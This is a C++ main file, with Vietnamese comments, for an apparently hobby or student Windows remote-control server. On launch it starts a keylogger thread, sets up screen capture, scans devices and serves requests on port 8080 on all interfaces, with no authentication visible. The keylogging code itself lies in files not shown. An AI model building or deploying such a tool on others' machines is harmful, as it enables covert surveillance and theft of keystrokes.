// server.cpp (File Main)
// Nhiem vu: Khoi tao server, chap nhan ket noi va chuyen cho Router.
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>

// Bao gom cac file .h moi
#include "RequestRouter.h"
#include "controllers/KeylogController.h"
#include "controllers/DeviceController.h"
#include "utils/helpers.h"
#include "utils/logging.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Ole32.lib")

using namespace Gdiplus;
using namespace std;

// --- HAM MAIN (DIEM KHOI CHAY CHUONG TRINH) ---
int main()
{
    int PORT = 8080;
    SetConsoleOutputCP(65001);    // Set console de hien thi tieng Viet
    srand((unsigned int)time(0)); // Khoi tao bo sinh so ngau nhien

    // Khoi tao GDI+ (de chup man hinh)
    GdiplusStartupInput g;
    ULONG_PTR t;
    GdiplusStartup(&t, &g, NULL);

    // Khoi tao Winsock
    WSADATA w;
    WSAStartup(MAKEWORD(2, 2), &w);

    // --- KHOI TAO CAC CONTROLLER TAI NGUYEN CHUNG ---
    // Bat dau luong keylogger (goi ham static)
    KeylogController::startKeyLoggerThread();
    // Quet thiet bi ngay khi khoi dong (goi ham static)
    DeviceController::buildDeviceListJson();

    // --- TAO ROUTER ---
    // Tao 1 instance (doi tuong) cua RequestRouter.
    // Doi tuong nay se chua instance cua *tat ca* cac controller khac.
    RequestRouter router;

    // --- KHOI TAO SOCKET ---
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in a = {AF_INET, htons(PORT)};
    a.sin_addr.s_addr = INADDR_ANY; // Lang nghe tren tat ca cac card mang
    bind(s, (sockaddr *)&a, sizeof(a));
    listen(s, SOMAXCONN);

    cout << "=== SERVER (REFACTORED OOP) READY ON PORT " << PORT << " ===\n";
    auto ips = getLocalIPv4Addresses(); // Goi ham tu helpers
    for (auto &ip : ips)
        cout << "http://" << ip << ":" << PORT << "/\n";

    // Vong lap vo han de chap nhan ket noi
    while (1)
    {
        sockaddr_in ca;
        int calen = sizeof(ca);
        SOCKET c = accept(s, (sockaddr *)&ca, &calen); // Chap nhan ket noi moi
        if (c != INVALID_SOCKET)
        {
            // Lay dia chi IP cua client de log
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(ca.sin_addr), ip, INET_ADDRSTRLEN);
            string clientInfo = string(ip) + ":" + to_string(ntohs(ca.sin_port));

            // Tao mot luong moi de xu ly client nay
            // Goi ham 'handleClient' CUA doi tuong 'router'
            thread(&RequestRouter::handleClient, &router, c, clientInfo).detach();
        }
    }

    // Don dep (mac du se khong bao gio chay den day)
    GdiplusShutdown(t);
    WSACleanup();
    closesocket(s);
    return 0;
}